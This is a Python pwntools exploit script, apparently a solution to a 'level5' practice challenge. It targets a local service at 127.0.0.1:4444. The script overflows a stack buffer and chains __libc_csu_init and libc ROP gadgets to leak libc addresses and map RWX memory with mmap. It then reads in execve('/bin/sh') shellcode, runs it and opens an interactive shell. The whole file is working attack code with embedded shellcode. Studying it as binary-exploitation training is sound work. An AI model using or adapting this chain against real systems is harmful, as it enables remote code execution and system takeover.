#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'

context(arch='amd64', os='linux')


EXE_IMG = './level5'
EXE = ELF(EXE_IMG)
ELF_CSU_INIT_POP = 0x4006AA
ELF_CSU_INIT_MOV = 0x400690

BSS = 0x600a88

OFFSET = 0x80
PADDING = 'a' * (OFFSET + 8)

# SHELLCODE = asm(shellcraft.sh())
SHELLCODE = 'jhH\xb8/bin///sPj;XH\x89\xe71\xf6\x99\x0f\x05'
SHELLCODE_ADDR = 0xbeef0000


class ElfConfig:
    io = remote('127.0.0.1', 4444)
    # io = process('./level5')
    LIBC_IMG = '/lib/x86_64-linux-gnu/libc.so.6'
    POP_RDI_RET = 0x21102
    POP_RSI_RET = 0x202e8
    POP_RDX_RET = 0x1b92
    # POP_RCX_RET = 0xd20a3
    # POP_RCX_JMP_RDX = 0x9fb08  # 0x0009fb08: pop rcx ; jmp qword [rdx-0x0F] ;
    POP_RCX_JMP_RDX = 0xa025b  # 0x000a025b: pop rcx ; jmp qword [rdx-0x0F] ;
    POP_R8_XXX_RET = 0x1350f6  # 0x001350f6: pop r8 ; mov eax, 0x00000001 ; ret  ;
    SHR_R9_XXX_RET = 0x48ac0 # 0x00048ac0: shr r9, cl ; mov qword [rdi+0x08], r9 ; ret  ;
    # mov_rdi_0x08_rax = 0x7b136  # 0x0007b136: mov qword [rdi+0x08], rax ; ret  ;

def main():
    env = ElfConfig()
    libc = ELF(env.LIBC_IMG)
    io = env.io
    # 获取 write@libc 地址
    p = PADDING
    p += p64(ELF_CSU_INIT_POP)  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15; ret ;
    p += p64(0)  # rbx
    p += p64(1)  # rbp
    p += p64(EXE.got['write'])  # r12
    p += p64(8)  # r13 -> rdx
    p += p64(EXE.got['write'])  # r14 -> rsi
    p += p64(1)  # r15 -> edi
    p += p64(ELF_CSU_INIT_MOV)  # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8];
    p += 7 * 8 * 'a'
    # 将跳转地址写入 BSS
    p += p64(ELF_CSU_INIT_POP)  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15; ret ;
    p += p64(0)  # rbx
    p += p64(1)  # rbp
    p += p64(EXE.got['read'])  # r12
    p += p64(16)  # r13 -> rdx
    p += p64(BSS)  # r14 -> rsi
    p += p64(0)  # r15 -> edi
    p += p64(ELF_CSU_INIT_MOV)  # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8];
    p += 7 * 8 * 'a'
    # p += p64(EXE.symbols['vulnerable_function'])
    p += p64(EXE.symbols['_start'])

    log.info('payload({})={}'.format(len(p), repr(p)))

    io.sendafter(':\n', p)

    out = io.recv()

    write_addr = u64(out[:8])
    log.success('write_addr = ' + hex(write_addr))
    libc_base = write_addr - libc.symbols['write']
    log.success('libc_base = ' + hex(libc_base))
    mmap_addr = libc_base + libc.symbols['mmap']
    log.success('mmap_addr = ' + hex(mmap_addr))
    read_addr = libc_base + libc.symbols['read']
    log.success('read_addr = ' + hex(read_addr))
    
    sleep(0.5)
    # 将跳转地址写入 BSS
    p = p64(libc_base + env.SHR_R9_XXX_RET) + p64(libc_base + env.POP_RDX_RET)
    log.info('payload({})={}'.format(len(p), repr(p)))
    io.send(p)

    out = io.recv()
    # raw_input('wait')

    # void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
    # rdi = addr, rsi = length, rdx = prot, rcx = flags, r8 = fd, r9 = offset
    p = PADDING
    # 由于修改r9指令需要修改rdi
    p += p64(libc_base + env.POP_RDI_RET) + p64(BSS + 8)  # mov qword [rdi+0x08], r9 -> r9写在 BSS + 16 的位置上，避免影响前面16位
    p += p64(libc_base + env.POP_RDX_RET) + p64(BSS + 0x0f)  # jmp qword [rdx-0x0F] 保证pop rcx jmp 时能跳转到[bss] SHR_R9_XXX_RET)
    # r9根据cl位移，所以需要修改rcx
    p += p64(libc_base + env.POP_RCX_JMP_RDX) + p64(0xffffffff)
    # r9置0    
    p += p64(libc_base + env.POP_R8_XXX_RET) + p64(0)
    p += p64(libc_base + env.POP_RDX_RET) + p64(BSS + 8 + 0x0F)  # jmp qword [rdx-0x0F] 保证pop rcx jmp 时能跳转到[bss + 8] POP_RDX_RET
    p += p64(libc_base + env.POP_RCX_JMP_RDX) + p64(0x22)  # 虽然不知道为什么 MAP_FIXED?
    p += p64(7)  # -> RDX
    p += p64(libc_base + env.POP_RSI_RET) + p64(64)
    p += p64(libc_base + env.POP_RDI_RET) + p64(SHELLCODE_ADDR)
    p += p64(mmap_addr)
    # p += p64(EXE.symbols['vulnerable_function'])
    p += p64(EXE.symbols['_start'])

    log.info('payload({})={}'.format(len(p), repr(p)))
    io.send(p)

    out = io.recv()

    # raw_input('wait')

    # 写入shellcode并执行
    p = PADDING
    p += p64(libc_base + env.POP_RDI_RET)
    p += p64(0)
    p += p64(libc_base + env.POP_RSI_RET)
    p += p64(SHELLCODE_ADDR)
    p += p64(libc_base + env.POP_RDX_RET)
    p += p64(len(SHELLCODE))
    p += p64(read_addr)
    p += p64(SHELLCODE_ADDR)

    log.info('payload({})={}'.format(len(p), repr(p)))
    io.send(p)
    # raw_input('wait')
    sleep(0.5)

    log.info('payload({})={}'.format(len(SHELLCODE), repr(SHELLCODE)))
    io.send(SHELLCODE)
    # raw_input('wait')
    sleep(0.5)

    io.interactive()

main()
